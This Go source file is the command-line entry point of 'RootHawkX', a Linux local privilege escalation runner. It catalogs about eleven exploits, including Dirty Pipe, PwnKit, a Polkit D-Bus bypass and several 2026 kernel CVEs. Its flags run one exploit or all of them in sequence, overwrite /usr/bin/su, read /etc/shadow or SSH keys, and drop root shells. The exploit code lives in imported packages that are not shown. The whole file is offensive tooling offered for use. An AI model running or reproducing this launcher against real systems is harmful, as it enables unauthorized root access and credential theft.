//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"roothawk/pkg/exploits/cve20213560"
	"roothawk/pkg/exploits/cve20214034"
	"roothawk/pkg/exploits/cve20220847"
	"roothawk/pkg/exploits/cve202631431"
	"roothawk/pkg/exploits/cve202643284"
	"roothawk/pkg/exploits/cve202643503"
	"roothawk/pkg/exploits/cve202646300"
	"roothawk/pkg/exploits/cve202646331"
	"roothawk/pkg/exploits/cve202646333"
	"roothawk/pkg/exploits/dirtydecrypt"
	"roothawk/pkg/exploits/pintheft"
	"roothawk/pkg/logger"
	"roothawk/pkg/state"
)

const version = "1.1.0"

type exploitDef struct {
	ID        string
	Aliases   []string
	Name      string
	RunName   string
	Component string
	Run       func(options runOptions) error
}

type runOptions struct {
	PKExecPath   string
	BackupPath   string
	RootExecPath string
	Target       string
	Verbose      bool
}

var catalog = []exploitDef{
	{
		ID:        "CVE-2026-31431",
		Aliases:   []string{"cve-2026-31431", "copyfail", "copy-fail", "copy fail"},
		Name:      "Copy Fail",
		RunName:   "CopyFail",
		Component: "Linux kernel LPE exploiting crypto / AF_ALG / algif_aead logical flaws.",
		Run: func(options runOptions) error {
			cve202631431.Run(options.BackupPath, options.RootExecPath)
			return nil
		},
	},
	{
		ID:        "CVE-2026-43284",
		Aliases:   []string{"cve-2026-43284", "cve-2026-43500", "dirty frag", "copyfail2", "copyfail-2"},
		Name:      "Dirty Frag, aka CopyFail2",
		RunName:   "Dirty Frag",
		Component: "Linux kernel LPE involving xfrm/esp and shared skb frags in network stack.",
		Run: func(options runOptions) error {
			return cve202643284.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2026-43503",
		Aliases:   []string{"cve-2026-43503", "dirtyclone", "dirty-clone"},
		Name:      "DirtyClone",
		RunName:   "DirtyClone",
		Component: "Linux kernel LPE via net/skbuff shared fragment cloning.",
		Run: func(options runOptions) error {
			return cve202643503.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2026-46300",
		Aliases:   []string{"cve-2026-46300", "fragnesia"},
		Name:      "Fragnesia",
		RunName:   "Fragnesia",
		Component: "Linux kernel LPE exploiting XFRM ESP-in-TCP subsystem flaw to overwrite /usr/bin/su via page cache.",
		Run: func(options runOptions) error {
			return cve202646300.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2026-46331",
		Aliases:   []string{"cve-2026-46331", "cow", "pedit", "cve-2026-46331 cow"},
		Name:      "Linux Kernel COW Bug (net/sched act_pedit)",
		RunName:   "Linux Kernel COW",
		Component: "Linux kernel LPE via net/sched act_pedit to overwrite kernel dirty data.",
		Run: func(options runOptions) error {
			return cve202646331.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2026-46333",
		Aliases:   []string{"cve-2026-46333", "keysign", "ssh-keysign-pwn"},
		Name:      "ssh-keysign-pwn",
		RunName:   "ssh-keysign-pwn",
		Component: "Linux kernel LPE race condition in process exit path allowing info disclosure. Use -target shadow or -target key.",
		Run: func(options runOptions) error {
			return cve202646333.Run(options.Target, options.Verbose)
		},
	},
	{
		ID:        "pintheft",
		Aliases:   []string{"CVE-2026-43494", "pin-theft", "PinTheft"},
		Name:      "PinTheft",
		RunName:   "PinTheft",
		Component: "Linux kernel LPE (CVE-2026-43494) utilizing RDS zerocopy double-free + io_uring page cache overwrite for a root shell.",
		Run: func(options runOptions) error {
			return pintheft.Run(options.Verbose)
		},
	},
	{
		ID:        "dirtydecrypt",
		Aliases:   []string{"CVE-2026-31635", "dirty-decrypt", "dirtycbc", "dirty-cbc", "DirtyDecrypt", "DirtyCBC"},
		Name:      "DirtyDecrypt / DirtyCBC",
		RunName:   "DirtyDecrypt",
		Component: "Linux kernel LPE (CVE-2026-31635) utilizing rxgk_decrypt_skb() missing COW protection for page cache overwrite.",
		Run: func(options runOptions) error {
			return dirtydecrypt.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2021-4034",
		Aliases:   []string{"cve-2021-4034", "pwnkit", "pkexec"},
		Name:      "PwnKit",
		RunName:   "PwnKit",
		Component: "Polkit pkexec local privilege escalation.",
		Run: func(options runOptions) error {
			return cve20214034.Run(options.PKExecPath)
		},
	},
	{
		ID:        "CVE-2021-3560",
		Aliases:   []string{"cve-2021-3560", "polkit:CVE-2021-3560", "polkit dbus", "polkit authentication bypass"},
		Name:      "Polkit D-Bus Authentication Bypass",
		RunName:   "Polkit Authentication Bypass",
		Component: "Polkit LPE via D-Bus requests bypassing credential checks.",
		Run: func(options runOptions) error {
			return runExploitModule(cve20213560.New())
		},
	},
	{
		ID:        "CVE-2022-0847",
		Aliases:   []string{"cve-2022-0847", "dirty pipe", "dirtypipe", "kernel:CVE-2022-0847"},
		Name:      "Dirty Pipe",
		RunName:   "Dirty Pipe",
		Component: "Linux kernel LPE via pipe mechanism.",
		Run: func(options runOptions) error {
			return runExploitModule(cve20220847.New())
		},
	},
}

func main() {
	var (
		showList         bool
		runAny           bool
		exploitName      string
		internalExploit  string
		pkexecPath       string
		copyFailBackup   string
		copyFailExecPath string
		targetOption     string
		verbose          bool
	)

	flag.BoolVar(&showList, "list", false, "list supported CVE exploit entries")
	flag.BoolVar(&runAny, "any", false, "execute every supported exploit in list order")
	flag.StringVar(&exploitName, "e", "", "execute one exploit by CVE name or alias")
	flag.StringVar(&internalExploit, "run-internal", "", "internal RootHawk worker mode")
	flag.StringVar(&pkexecPath, "pk", "/usr/bin/pkexec", "pkexec path for CVE-2021-4034")
	flag.StringVar(&copyFailBackup, "backup", "", "backup path for CVE-2026-31431 before overwriting su")
	flag.StringVar(&copyFailExecPath, "exec", "", "CVE-2026-31431: command path to run as root instead of spawning su")
	flag.StringVar(&targetOption, "target", "", "specify a target function/module (e.g. shadow or key for CVE-2026-46333)")
	flag.BoolVar(&verbose, "v", false, "verbose output where supported")
	flag.Usage = printHelp
	flag.Parse()

	options := runOptions{
		PKExecPath:   pkexecPath,
		BackupPath:   copyFailBackup,
		RootExecPath: copyFailExecPath,
		Target:       targetOption,
		Verbose:      verbose,
	}

	if internalExploit != "" {
		if err := runExploit(internalExploit, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			os.Exit(1)
		}
		return
	}

	banner()

	switch {
	case showList:
		printList()
	case exploitName != "":
		if err := runChild(exploitName, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			os.Exit(1)
		}
	case runAny:
		runAll(options)
	default:
		printHelp()
	}
}

func banner() {
	fmt.Println(cyan("    ____              __  __  __               __  _  __"))
	fmt.Println(cyan("   / __ \\____  ____  / /_/ / / /___ __      __/ /_| |/ /"))
	fmt.Println(cyan("  / /_/ / __ \\/ __ \\/ __/ /_/ / __ `/ | /| / / //_/   / "))
	fmt.Println(cyan(" / _, _/ /_/ / /_/ / /_/ __  / /_/ /| |/ |/ / ,< /   |  "))
	fmt.Println(cyan("/_/ |_|\\____/\\____/\\__/_/ /_/\\__,_/ |__/|__/_/|_/_/|_|  "))
	fmt.Printf("%s %s\n\n", yellow("RootHawkX"), faint("Linux local privilege escalation runner v"+version))
}

func printHelp() {
	fmt.Println("Usage:")
	fmt.Println("  RootHawkX -list")
	fmt.Println("  RootHawkX -e <CVE-or-alias> [options]")
	fmt.Println("  RootHawkX -any [options]")
	fmt.Println()
	fmt.Println("Options:")
	fmt.Println("  -list              List integrated CVEs")
	fmt.Println("  -e <name>          Execute specific CVE by name (e.g. -e CVE-2022-0847)")
	fmt.Println("  -any               Execute all exploits sequentially")
	fmt.Println("  -pk <path>         Path to pkexec for CVE-2021-4034 (default: /usr/bin/pkexec)")
	fmt.Println("  -backup <path>     Path to backup su before execution for CVE-2026-31431")
	fmt.Println("  -exec <path>       Command path to run as root instead of spawning su for CVE-2026-31431")
	fmt.Println("  -target <name>     Specify target module/function (e.g., key or shadow for CVE-2026-46333)")
	fmt.Println("  -v                 Verbose output")
	fmt.Println("  -help              Show this help menu")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  RootHawkX -list")
	fmt.Println("  RootHawkX -e CVE-2022-0847")
	fmt.Println("  RootHawkX -e CVE-2026-31431 -backup /tmp/su.bak")
	fmt.Println("  RootHawkX -e CVE-2026-43284 -v")
	fmt.Println("  RootHawkX -any")
}

func printList() {
	fmt.Printf("%s\n", green("[+] RootHawkX supported CVEs"))
	for _, item := range catalog {
		fmt.Printf("\n  %s\n", red(item.ID))
		fmt.Printf("      %s %s\n", yellow("Alias:"), cyan(item.Name))
		fmt.Printf("      %s %s\n", yellow("Desc :"), item.Component)
	}
}

func runAll(options runOptions) {
	for _, item := range catalog {
		fmt.Printf("\n%s Running %s (%s)\n", cyan("[*]"), green(item.RunName), red(item.ID))
		if err := runChild(item.ID, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			continue
		}
		fmt.Printf("%s %s completed\n", green("[+]"), item.ID)
	}
}

func runChild(name string, options runOptions) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	args := []string{"-run-internal", name, "-pk", options.PKExecPath}
	if options.BackupPath != "" {
		args = append(args, "-backup", options.BackupPath)
	}
	if options.RootExecPath != "" {
		args = append(args, "-exec", options.RootExecPath)
	}
	if options.Target != "" {
		args = append(args, "-target", options.Target)
	}
	if options.Verbose {
		args = append(args, "-v")
	}
	cmd := exec.Command(exe, args...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func runExploit(name string, options runOptions) error {
	item, ok := lookupExploit(name)
	if !ok {
		return fmt.Errorf("unknown exploit %q, use -list to see supported names", name)
	}
	fmt.Printf("%s Running %s (%s)\n", cyan("[*]"), green(item.RunName), red(item.ID))
	return item.Run(options)
}

func lookupExploit(name string) (exploitDef, bool) {
	needle := normalizeName(name)
	for _, item := range catalog {
		if normalizeName(item.ID) == needle || normalizeName(item.Name) == needle || normalizeName(item.RunName) == needle {
			return item, true
		}
		for _, alias := range item.Aliases {
			if normalizeName(alias) == needle {
				return item, true
			}
		}
	}
	return exploitDef{}, false
}

func normalizeName(name string) string {
	return strings.ToLower(strings.TrimSpace(name))
}

type moduleVulnerability interface {
	IsVulnerable(context.Context, *state.State, logger.Logger) bool
}

type moduleShellDropper interface {
	Shell(context.Context, *state.State, logger.Logger) error
}

func runExploitModule(v interface {
	moduleVulnerability
	moduleShellDropper
}) error {
	ctx := context.Background()
	log := logger.New()
	s := state.New()
	s.Assess()
	if !v.IsVulnerable(ctx, s, log) {
		return fmt.Errorf("target does not look vulnerable")
	}
	return v.Shell(ctx, s, log)
}

func cyan(s string) string   { return "\x1b[36m" + s + "\x1b[0m" }
func green(s string) string  { return "\x1b[32m" + s + "\x1b[0m" }
func yellow(s string) string { return "\x1b[33m" + s + "\x1b[0m" }
func red(s string) string    { return "\x1b[31m" + s + "\x1b[0m" }
func faint(s string) string  { return "\x1b[2m" + s + "\x1b[0m" }
